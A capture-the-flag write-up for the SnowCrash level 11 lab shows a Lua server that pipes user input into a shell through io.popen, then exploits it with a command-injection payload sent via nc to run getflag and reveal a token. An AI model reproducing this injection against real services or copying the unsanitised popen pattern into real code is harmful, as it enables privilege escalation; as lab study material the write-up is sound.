in this level we have a file containing a lua script that has a `SUID` bit set

```shell
level11@SnowCrash:~$ cat level11.lua
#!/usr/bin/env lua
local socket = require("socket") # Import the LuaSocket library for network operations
local server = assert(socket.bind("127.0.0.1", 5151)) # Create a TCP server bound to localhost port 5151

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r") # Execute shell command to calculate SHA1 sum of the password
  data = prog:read("*all") # Read the output of the command
  prog:close() # Close the command pipe

  data = string.sub(data, 1, 40) # Extract just the hash part (first 40 characters)

  return data
end


while 1 do
  local client = server:accept() # Wait for and accept a client connection
  client:send("Password: ") # Send password prompt to client
  client:settimeout(60) # Set 60 second timeout for client response
  local l, err = client:receive() # Receive data from client
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n"); # Wrong password response
      else
          client:send("Gz you dumb*\n") # Correct password response
      end

  end

  client:close() # Close the client connection
end
level11@SnowCrash:~$
```

after trying to connect to the localhost:5151 we can deduce that the script is already running with the permission of the `flag` user permissions.

we can use the password input to execute any shell command we want by commenting the ` | sha1sum` part.

lets try and see : 

```shell
level11@SnowCrash:~$ nc localhost 5151
Password: hi; getflag > /tmp/file #
Erf nope..
level11@SnowCrash:~$ cat /tmp/file
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
level11@SnowCrash:~$
```

and there you go .Let's move on to the next level.

